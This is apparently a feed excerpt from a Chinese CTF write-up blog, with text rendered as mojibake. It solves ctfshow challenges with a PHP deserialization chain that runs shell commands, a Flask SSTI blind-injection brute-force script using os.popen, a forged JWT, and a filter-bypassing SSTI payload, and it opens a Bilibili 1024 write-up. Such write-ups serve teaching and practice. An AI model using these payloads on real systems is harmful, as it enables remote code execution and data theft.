&lt;span style="color:#00a8c8">if&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">preg_match&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;/php/&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#111">$output&lt;/span>&lt;span style="color:#111">)){&lt;/span>
&lt;span style="color:#00a8c8">echo&lt;/span> &lt;span style="color:#d88200">&amp;#34;å¥—ç¥é»‘è¿›è¿™é‡Œå¹¶ç»™ä½ äº†ä¸€ä¸ªæç¤ºï¼šæ–‡ä»¶åæ˜¯få¼€å¤´çš„å½¢å¦‚fA6_å½¢å¼çš„æ–‡ä»¶&amp;#34;&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;span style="color:#00a8c8">die&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;ä¸å¯ä»¥ç”¨ä¼ªåè®®å“¦&amp;#34;&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>å…ˆç›´æ¥æ”¾payloadæŠŠï¼Œç›´æ¥ç”¨çš„action_3çš„rce&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-php" data-lang="php">&lt;span style="color:#f92672">&amp;lt;?&lt;/span>&lt;span style="color:#75af00">php&lt;/span>
&lt;span style="color:#00a8c8">class&lt;/span> &lt;span style="color:#75af00">action_4&lt;/span>&lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">function&lt;/span> &lt;span style="color:#111">__construct&lt;/span>&lt;span style="color:#111">(){&lt;/span>
&lt;span style="color:#111">$this&lt;/span>&lt;span style="color:#f92672">-&amp;gt;&lt;/span>&lt;span style="color:#75af00">ctf&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">&amp;#39;action_3&amp;#39;&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;span style="color:#111">$this&lt;/span>&lt;span style="color:#f92672">-&amp;gt;&lt;/span>&lt;span style="color:#75af00">show&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">&amp;#39;cat /fz3_.txt&amp;#39;&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#00a8c8">class&lt;/span> &lt;span style="color:#75af00">action_2&lt;/span>&lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">function&lt;/span> &lt;span style="color:#111">__construct&lt;/span>&lt;span style="color:#111">(){&lt;/span>
&lt;span style="color:#111">$this&lt;/span>&lt;span style="color:#f92672">-&amp;gt;&lt;/span>&lt;span style="color:#75af00">p&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#75af00">action_4&lt;/span>&lt;span style="color:#111">();&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#00a8c8">class&lt;/span> &lt;span style="color:#75af00">action_1&lt;/span>&lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">function&lt;/span> &lt;span style="color:#111">__construct&lt;/span>&lt;span style="color:#111">(){&lt;/span>
&lt;span style="color:#111">$this&lt;/span>&lt;span style="color:#f92672">-&amp;gt;&lt;/span>&lt;span style="color:#75af00">tmp&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#75af00">action_2&lt;/span>&lt;span style="color:#111">();&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#00a8c8">class&lt;/span> &lt;span style="color:#75af00">action_3&lt;/span>&lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">function&lt;/span> &lt;span style="color:#111">__construct&lt;/span>&lt;span style="color:#111">(){&lt;/span>
&lt;span style="color:#111">$this&lt;/span>&lt;span style="color:#f92672">-&amp;gt;&lt;/span>&lt;span style="color:#75af00">str&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#75af00">action_1&lt;/span>&lt;span style="color:#111">();&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#00a8c8">echo&lt;/span> &lt;span style="color:#75af00">serialize&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#75af00">action_3&lt;/span>&lt;span style="color:#111">());&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>è¿™ä¸ªåº”è¯¥æ¯”è¾ƒç®€å•ï¼Œä¸ç”¨åˆ†æéƒ½èƒ½çœ‹æ˜ç™½&lt;/p>
&lt;p>å®˜æ–¹wpçš„é¢„æœŸè§£é•¿è¿™æ ·-&amp;gt;&lt;a href="https://qgieod1s9b.feishu.cn/docs/doccnNEAk0zZJDhi7bypQhF6eFf#Nb2X8y">wp&lt;/a>ï¼Œé¦–å…ˆç”¨åˆ°äº†phpçš„å†…ç½®ç±»DirectoryIteratoré…åˆglobä¼ªåè®®çˆ†ç ´flagæ–‡ä»¶å&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-php" data-lang="php">&lt;span style="color:#f92672">&amp;lt;?&lt;/span>&lt;span style="color:#75af00">php&lt;/span>
&lt;span style="color:#00a8c8">class&lt;/span> &lt;span style="color:#75af00">action_4&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">function&lt;/span> &lt;span style="color:#111">__construct&lt;/span>&lt;span style="color:#111">(){&lt;/span>
&lt;span style="color:#111">$this&lt;/span>&lt;span style="color:#f92672">-&amp;gt;&lt;/span>&lt;span style="color:#75af00">ctf&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">&amp;#34;DirectoryIterator&amp;#34;&lt;/span>&lt;span style="color:#111">;&lt;/span> &lt;span style="color:#75715e">//GlobIterator
&lt;/span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#111">$this&lt;/span>&lt;span style="color:#f92672">-&amp;gt;&lt;/span>&lt;span style="color:#75af00">show&lt;/span> &lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#d88200">&amp;#34;glob:///f[A-z][0-9]_*&amp;#34;&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#00a8c8">class&lt;/span> &lt;span style="color:#75af00">action_3&lt;/span>&lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">function&lt;/span> &lt;span style="color:#111">__construct&lt;/span>&lt;span style="color:#111">(){&lt;/span>
&lt;span style="color:#111">$this&lt;/span>&lt;span style="color:#f92672">-&amp;gt;&lt;/span>&lt;span style="color:#75af00">str&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#75af00">action_1&lt;/span>&lt;span style="color:#111">();&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#00a8c8">class&lt;/span> &lt;span style="color:#75af00">action_1&lt;/span>&lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">function&lt;/span> &lt;span style="color:#111">__construct&lt;/span>&lt;span style="color:#111">(){&lt;/span>
&lt;span style="color:#111">$this&lt;/span>&lt;span style="color:#f92672">-&amp;gt;&lt;/span>&lt;span style="color:#75af00">tmp&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#75af00">action_2&lt;/span>&lt;span style="color:#111">();&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#00a8c8">class&lt;/span> &lt;span style="color:#75af00">action_2&lt;/span>&lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">function&lt;/span> &lt;span style="color:#111">__construct&lt;/span>&lt;span style="color:#111">(){&lt;/span>
&lt;span style="color:#111">$this&lt;/span>&lt;span style="color:#f92672">-&amp;gt;&lt;/span>&lt;span style="color:#75af00">p&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#75af00">action_4&lt;/span>&lt;span style="color:#111">();&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#00a8c8">echo&lt;/span> &lt;span style="color:#75af00">serialize&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#75af00">action_3&lt;/span>&lt;span style="color:#111">());&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>è¿™ä¸ªç¡®å®ï¼Œä½†æ˜¯ä¹‹åçš„&lt;code>call_user_func&lt;/code>ï¼Œæˆ‘åªèƒ½è¯´ æœ‰ä¸€è¯´ä¸€ æˆ‘æ˜¯æ²¡å¤ç°æˆåŠŸ&lt;/p>
&lt;p>è¿™é‡Œçš„æ­»äº¡wakeupæ°¸è¿œä¼šæ¯”callå…ˆè°ƒç”¨ï¼Œfuncè¿™é‡Œè¿˜æ²¡åˆ°call_user_funcå°±å…ˆè¢«æ¸…ç©ºäº†ï¼Œæ€ä¹ˆæ‰§è¡Œï¼Ÿï¼Ÿï¼Ÿ&lt;/p>
&lt;h2 id="è¿‘åœ¨çœ¼å‰">è¿‘åœ¨çœ¼å‰&lt;/h2>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-python" data-lang="python">&lt;span style="color:#75715e">#!/usr/bin/env python3&lt;/span>
&lt;span style="color:#f92672">from&lt;/span> &lt;span style="color:#111">flask&lt;/span> &lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">Flask&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">render_template_string&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">request&lt;/span>
&lt;span style="color:#f92672">from&lt;/span> &lt;span style="color:#111">flask_limiter&lt;/span> &lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">Limiter&lt;/span>
&lt;span style="color:#f92672">from&lt;/span> &lt;span style="color:#111">flask_limiter.util&lt;/span> &lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">get_remote_address&lt;/span>
&lt;span style="color:#111">app&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">Flask&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">__name__&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#111">limiter&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">Limiter&lt;/span>&lt;span style="color:#111">(&lt;/span>
&lt;span style="color:#111">app&lt;/span>&lt;span style="color:#111">,&lt;/span>
&lt;span style="color:#111">key_func&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#111">get_remote_address&lt;/span>&lt;span style="color:#111">,&lt;/span>
&lt;span style="color:#111">default_limits&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#d88200">&amp;#34;10000 per hour&amp;#34;&lt;/span>&lt;span style="color:#111">]&lt;/span>
&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#75af00">@limiter&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">limit&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;5/second&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">override_defaults&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#00a8c8">True&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#75af00">@app&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">route&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;/&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#00a8c8">def&lt;/span> &lt;span style="color:#75af00">index&lt;/span>&lt;span style="color:#111">():&lt;/span>
&lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;&lt;/span>&lt;span style="color:#8045ff">\x3c&lt;/span>&lt;span style="color:#d88200">pre&lt;/span>&lt;span style="color:#8045ff">\x3e\x3c&lt;/span>&lt;span style="color:#d88200">code&lt;/span>&lt;span style="color:#8045ff">\x3e&lt;/span>&lt;span style="color:#d88200">%s&lt;/span>&lt;span style="color:#8045ff">\x3c&lt;/span>&lt;span style="color:#d88200">/code&lt;/span>&lt;span style="color:#8045ff">\x3e\x3c&lt;/span>&lt;span style="color:#d88200">/pre&lt;/span>&lt;span style="color:#8045ff">\x3e&lt;/span>&lt;span style="color:#d88200">&amp;#34;&lt;/span>&lt;span style="color:#111">)&lt;/span>&lt;span style="color:#f92672">%&lt;/span>&lt;span style="color:#111">open&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">__file__&lt;/span>&lt;span style="color:#111">)&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">read&lt;/span>&lt;span style="color:#111">()&lt;/span>
&lt;span style="color:#75af00">@limiter&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">limit&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;5/second&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">override_defaults&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#00a8c8">True&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#75af00">@app&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">route&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;/ssti&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#00a8c8">def&lt;/span> &lt;span style="color:#75af00">check&lt;/span>&lt;span style="color:#111">():&lt;/span>
&lt;span style="color:#111">flag&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">open&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;/app/flag.txt&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#d88200">&amp;#39;r&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">read&lt;/span>&lt;span style="color:#111">()&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">strip&lt;/span>&lt;span style="color:#111">()&lt;/span>
&lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#d88200">&amp;#34;input&amp;#34;&lt;/span> &lt;span style="color:#f92672">in&lt;/span> &lt;span style="color:#111">request&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">args&lt;/span>&lt;span style="color:#111">:&lt;/span>
&lt;span style="color:#111">query&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">request&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">args&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#d88200">&amp;#34;input&amp;#34;&lt;/span>&lt;span style="color:#111">]&lt;/span>
&lt;span style="color:#111">render_template_string&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">query&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#d88200">&amp;#34;Thank you for your input.&amp;#34;&lt;/span>
&lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#d88200">&amp;#34;No input found.&amp;#34;&lt;/span>
&lt;span style="color:#111">app&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">run&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;0.0.0.0&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#ae81ff">80&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>å±äºæ˜¯char-by-charç±»å‹ç›²æ³¨å’Œsstiçš„ç»“åˆï¼Œé™åˆ¶äº†1ç§’5æ¬¡è¯·æ±‚ï¼Œæ‰€ä»¥éœ€è¦æˆ‘ä»¬ç‰¹æ„é™åˆ¶ä¸€ä¸‹&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-python" data-lang="python">&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">requests&lt;/span>
&lt;span style="color:#111">_url&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">&amp;#39;http://9a5415f7-b712-423d-b7d4-7f2d61665f95.challenge.ctf.show/ssti?input=&amp;#39;&lt;/span>
&lt;span style="color:#111">_payload_1&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">&amp;#34;{%25 set flag=config.__class__.__init__.__globals__[&amp;#39;os&amp;#39;].popen(&amp;#39;cat /app/flag.txt&amp;#39;).read()%25}{%25 set sleep=config.__class__.__init__.__globals__[&amp;#39;os&amp;#39;].popen(&amp;#39;sleep 2.5&amp;#39;)%25}{&lt;/span>&lt;span style="color:#d88200">%25i&lt;/span>&lt;span style="color:#d88200">f &amp;#39;&amp;#34;&lt;/span>
&lt;span style="color:#111">_payload_2&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">&amp;#34;&amp;#39; in flag%25}{{sleep.read()}}{&lt;/span>&lt;span style="color:#d88200">%25e&lt;/span>&lt;span style="color:#d88200">ndif%25}&amp;#34;&lt;/span>
&lt;span style="color:#111">r&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">requests&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">session&lt;/span>&lt;span style="color:#111">()&lt;/span>
&lt;span style="color:#111">charset&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">&amp;#39;abcdefghijklmnopqrstuvwxyz0123456789-_&lt;/span>&lt;span style="color:#d88200">{}&lt;/span>&lt;span style="color:#d88200">&amp;#39;&lt;/span>
&lt;span style="color:#111">data&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">&amp;#39;&amp;#39;&lt;/span>
&lt;span style="color:#111">content&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">&amp;#39;ctfshow{&amp;#39;&lt;/span>
&lt;span style="color:#00a8c8">for&lt;/span> &lt;span style="color:#111">_&lt;/span> &lt;span style="color:#f92672">in&lt;/span> &lt;span style="color:#111">range&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#ae81ff">40&lt;/span>&lt;span style="color:#111">):&lt;/span>
&lt;span style="color:#00a8c8">for&lt;/span> &lt;span style="color:#111">i&lt;/span> &lt;span style="color:#f92672">in&lt;/span> &lt;span style="color:#111">charset&lt;/span>&lt;span style="color:#111">:&lt;/span>
&lt;span style="color:#111">data&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">content&lt;/span> &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#111">i&lt;/span>
&lt;span style="color:#75715e"># print(data)&lt;/span>
&lt;span style="color:#111">url&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">_url&lt;/span> &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#111">_payload_1&lt;/span> &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#111">data&lt;/span> &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#111">_payload_2&lt;/span>
&lt;span style="color:#00a8c8">try&lt;/span>&lt;span style="color:#111">:&lt;/span>
&lt;span style="color:#111">r&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">get&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">url&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#111">url&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">timeout&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#ae81ff">2.5&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#ae81ff">2.5&lt;/span>&lt;span style="color:#111">))&lt;/span>
&lt;span style="color:#00a8c8">except&lt;/span> &lt;span style="color:#75af00">Exception&lt;/span> &lt;span style="color:#00a8c8">as&lt;/span> &lt;span style="color:#111">e&lt;/span>&lt;span style="color:#111">:&lt;/span>
&lt;span style="color:#111">content&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">data&lt;/span>
&lt;span style="color:#111">print&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">content&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#00a8c8">break&lt;/span>
&lt;span style="color:#111">print&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">data&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>æœ‰å°æ¦‚ç‡ä¼šå´©ï¼Œå¯ä»¥å¤šè·‘ä¸€æ¬¡&lt;/p>
&lt;h2 id="é€šå…³å¤§ä½¬">é€šå…³å¤§ä½¬&lt;/h2>
&lt;p>ç™»å½•ï¼Œå°è¯•admin: adminï¼Œå›æ˜¾ ä½ ä¸èƒ½ä»¥ç®¡ç†å‘˜è´¦å·ç™»å½•ï¼ŒæŠ“åŒ…çœ‹åˆ°jwtï¼Œå…ˆç”¨jwt.ioæ¢­ä¸€ä¸‹&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211115110336856.png" alt="image-20211115110336856">&lt;/p>
&lt;p>å†ç”¨c-jwt-crackeræ¢­ä¸€ä¸‹ï¼Œçˆ†å‡ºæ¥key=12345ï¼ˆä¸è¿‡è¯´å®è¯æˆ‘è¿™é‡ŒçœŸæ²¡çˆ†å‡ºæ¥ï¼‰ï¼Œå†ç”¨jwt.ioæ”¹ä¸€ä¸‹userå’Œexp&lt;/p>
&lt;pre tabindex="0">&lt;code>eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJuYW1lIjoiYWRtaW4iLCJleHAiOjE2MzY5NTUwNjR9.jEw2QuCd67ZRC_eAVynhcZTYAyjHSxfrrpkqEF98Uio
&lt;/code>&lt;/pre>&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211115120908659.png" alt="image-20211115120908659">&lt;/p>
&lt;p>çœ‹åˆ°è¿™ç§çš„æ¡†ï¼Œç›´è§‰å°±æ˜¯sqli, xss, sstiï¼›åŠ ä¸Šjwtä¸€èˆ¬flaskä¼šç”¨ï¼Œè¯•ä¸€ä¸‹sstiï¼Œæœç„¶&lt;/p>
&lt;p>è¿™é‡Œçš„é€šå…³äººå¯¹é•¿åº¦è¿›è¡Œäº†é™åˆ¶ï¼Œæ’åéœ€è¦æ˜¯æ•°å­—ï¼Œæ—¶é—´æ²¡æœ‰å•¥å¿…è¦æ”¹ï¼Œæ„Ÿè¨€ä¸é™é•¿åº¦ï¼Œä½†æ˜¯è¿‡æ»¤äº†ä¸€ç¥¨å­—ç¬¦ï¼ˆå•åŒå¼•å·ï¼ˆæ— æ³•ç”¨hexå’Œæ‹¼æ¥ï¼‰ï¼Œä¸‹åˆ’çº¿ï¼Œrequestï¼Œä¸­æ‹¬å·ï¼Œç™¾åˆ†å·ï¼ˆæ— æ³•forè¯­å¥éå† å¦‚æœç”¨chr()è¿˜å¾—çˆ†ç ´ï¼‰ï¼Œç®—æ˜¯æ¯”è¾ƒä¸¥æ ¼çš„äº†ï¼‰ï¼Œå¯ä»¥ç”¨&lt;code>|attr()&lt;/code>è¿™æ ·çš„å½¢å¼æ¥ç»•è¿‡ï¼Œçœ‹äº†wpä¹‹åå‘ç°è¿™é‡Œè¿˜ç»“åˆäº†&lt;code>request.args&lt;/code>ï¼Œä¹Ÿå°±æ˜¯åŠ ä¸€äº›getå‚æ•°ç„¶ååœ¨postçš„éƒ¨åˆ†è¿›è¡Œå¼•ç”¨ï¼Œå†å……åˆ†åˆ©ç”¨configè¿™ä¸ªå¯¹è±¡ï¼ˆå‰é¢é‚£ä¸ªåŸé¢˜ä¹Ÿæ˜¯å……åˆ†ç”¨äº†configï¼‰ï¼Œpayload:&lt;/p>
&lt;pre tabindex="0">&lt;code>/edit?a=__init__&amp;amp;b=__globals__&amp;amp;c=__getitem__&amp;amp;d=os&amp;amp;e=popen&amp;amp;f=whoami&amp;amp;g=read
POST: name={%25set%20r=request.args%25}&amp;amp;rank=1&amp;amp;speech={{(config|attr(r.a)|attr(r.b))|attr(r.c)(r.d)|attr(r.e)(r.f)|attr(r.g)()}}&amp;amp;time=2021å¹´11æœˆ11æ—¥
&lt;/code>&lt;/pre></description></item><item><title>Bilibili 1024å®‰å…¨æ”»é˜² Wp</title><link>https://amiaaaz.github.io/2021/11/14/bilibili-sec1024-wp/</link><pubDate>Sun, 14 Nov 2021 20:15:47 +0800</pubDate><guid>https://amiaaaz.github.io/2021/11/14/bilibili-sec1024-wp/</guid><description>&lt;h2 id="å®‰å…¨æ”»é˜²--1">å®‰å…¨æ”»é˜²&amp;ndash;1&lt;/h2>
&lt;blockquote>
&lt;p>&lt;a href="https://security.bilibili.com/sec1024/q/r1.html">https://security.bilibili.com/sec1024/q/r1.html&lt;/a> | &lt;a href="https://baike.baidu.com/item/%E9%AB%98%E7%BA%A7%E5%8A%A0%E5%AF%86%E6%A0%87%E5%87%86/468774">æç¤º&lt;/a>&lt;/p>
&lt;p>1024ç¨‹åºå‘˜èŠ‚ï¼Œå¤§å®¶ä¸€èµ·å’Œ2233å‚ä¸è§£å¯†æ¸¸æˆå§~
happy_1024_2233:
e9ca6f21583a1533d3ff4fd47ddc463c6a1c7d2cf084d364
0408abca7deabb96a58f50471171b60e02b1a8dbd32db156&lt;/p>
&lt;/blockquote>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211114154001444.png" alt="image-20211114154001444">&lt;/p>
&lt;p>&lt;code>a1cd5f84-27966146-3776f301-64031bb9&lt;/code>&lt;/p>
&lt;h2 id="å®‰å…¨æ”»é˜²--2">å®‰å…¨æ”»é˜²&amp;ndash;2&lt;/h2>
&lt;blockquote>
&lt;p>&lt;a href="https://security.bilibili.com/sec1024/q/">https://security.bilibili.com/sec1024/q/&lt;/a> | &lt;a href="https://cli.vuejs.org/zh/config/#productionsourcemap">æç¤º&lt;/a>&lt;/p>
&lt;p>æŸé«˜çº§å‰ç«¯å¼€å‘æ”»åŸç‹®æ›´æ”¹äº†ä¸€ä¸ªå‰ç«¯é…ç½®é¡¹&lt;/p>
&lt;/blockquote>
&lt;p>æç¤ºä¸­ç»™çš„æ˜¯vueçš„å®˜æ–¹æ–‡æ¡£ï¼Œå¹¶ä¸”å®šä½åˆ°äº†productionSourceMap&lt;/p>
&lt;p>æ¥ä¸€æ³¢f12&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211114154330638.png" alt="image-20211114154330638">&lt;/p>
&lt;p>&lt;code>36c7a7b4-cda04af0-8db0368d-b5166480&lt;/code>&lt;/p>
&lt;h2 id="å®‰å…¨æ”»é˜²--3">å®‰å…¨æ”»é˜²&amp;ndash;3&lt;/h2>
&lt;blockquote>
&lt;p>&lt;a href="https://security.bilibili.com/sec1024/q/eval.zip">https://security.bilibili.com/sec1024/q/eval.zip&lt;/a> | &lt;a href="https://www.php.net/manual/zh/function.preg-match.php">æç¤º&lt;/a>&lt;/p>
&lt;p>PHP is the best language for web programming, but what about other languages?&lt;/p>
&lt;/blockquote>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-php" data-lang="php">&lt;span style="color:#f92672">&amp;lt;?&lt;/span>&lt;span style="color:#75af00">php&lt;/span>
